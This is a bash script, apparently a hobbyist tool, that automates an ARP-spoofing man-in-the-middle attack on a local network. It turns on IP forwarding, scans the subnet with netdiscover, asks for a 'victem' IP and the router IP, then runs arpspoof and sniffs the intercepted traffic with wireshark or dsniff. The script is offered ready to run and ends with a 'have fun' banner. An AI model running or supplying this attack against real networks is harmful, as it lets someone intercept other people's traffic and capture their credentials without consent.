#!/bin/bash
red="\e[0;91m"
reset="\e[0m"
clear
banner(){
echo -e   """

888b     d888      8888888      88888888888      888b     d888 
8888b   d8888        888            888          8888b   d8888 
88888b.d88888        888            888          88888b.d88888 
888Y88888P888        888            888          888Y88888P888 
888 Y888P 888        888            888          888 Y888P 888 
888  Y8P  888        888            888          888  Y8P  888 
888   ^   888        888            888          888   ^   888 
888       888      8888888          888          888       888 



c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}"""
echo " " 

}

interface(){
echo ""
read -p "what is your interface :  "  I
if [[ $I  == ""  ]]; then 
	echo ""
	echo -e "${red}you have to tybe your interface -_- !${reset}"
	sleep 1
	interface
fi
}
IP(){
	echo ""
	read -p "what is your private IP : " IP
if [[ $IP == "" ]]
 then
 	echo ""
	echo -e  "${red}you have to tybe your private IP  -_-${reset}"
	sleep 1 
	IP
fi
}
vic(){
echo '1' > /proc/sys/net/ipv4/ip_forward


echo ''
read -p "Enter IP victem First then IP router : " V R
if [[ $R == "" ]]
then
	echo ' '
	echo -e "${red}you have to tybe victem IP and router IP !  ${reset}"
	sleep 0.9s 
	vic
elif [[ $V == "" ]]
then
	echo ' '
	echo -e "${red}you have to tybe victem IP and router IP !  ${reset}"
	sleep 0.9s
	vic
fi
}
banner
roo=$(whoami)
if [ $roo != root -o $UID == 1000 ];
 then
echo -e  "${red}run it as root !${red}"
sleep 1
exit
fi
echo "hello (: "
sleep 1
read -p  """
{1} > Yes 
{2} > No

install requirements ? : """ req 
if [[ $req == 1 || $req == Yes || $req == yes ]] ;
then
	sudo apt-get update -y && sudo apt-get install dsniff && sudo apt-get install netdiscover && sudo apt-get install xterm
clear
banner
fi
interface
IP
sudo timeout 7 netdiscover -r $IP/24
vic
read -p """
{1} > wireshark

{2} > dsniff


choose your sniffing tool ! : """ sn
if [ $sn == 1 -o $sn == wireshark ]
then 

xterm -e sudo arpspoof -i $I -t $V $R -r | xterm -e wireshark -i $I

elif [ $sn == 2 -o $sn == dsniff ]
then
	xterm -e sudo arpspoof -i $I -t $V $R -r | dsniff -i $I
fi
echo -e """
                             
 #    #   ##   #    # ###### 
 #    #  #  #  #    # #      
 ###### #    # #    # #####  
 #    # ###### #    # #      
 #    # #    #  #  #  #      
 #    # #    #   ##   ###### 
                             
                             
 ###### #    # #    #        
 #      #    # ##   #        
 #####  #    # # #  #        
 #      #    # #  # #        
 #      #    # #   ##        
 #       ####  #    #        
                             
    #  #####                 
   #  #     #                
  #         #                
 #     #####                 
  #         #                
   #  #     #                
    #  #####                 
                             
c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}

"""
sleep 3
exit